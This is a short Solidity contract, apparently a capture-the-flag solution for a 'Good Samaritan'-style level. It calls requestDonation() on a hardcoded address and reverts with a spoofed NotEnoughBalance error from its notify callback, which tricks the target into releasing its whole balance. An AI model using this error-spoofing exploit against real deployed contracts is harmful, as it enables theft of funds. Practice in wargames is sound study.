// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Evil28 {
    address samaritan = 0x594e81BbDd5AC66a60741830ced8e1732B016546;

    error NotEnoughBalance();

    function pwn() external {
        samaritan.call(abi.encodeWithSignature("requestDonation()"));
    }

    function notify(uint256 amount) external {
        // bytes memory r = abi.encodeWithSignature("NotEnoughBalance()");
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
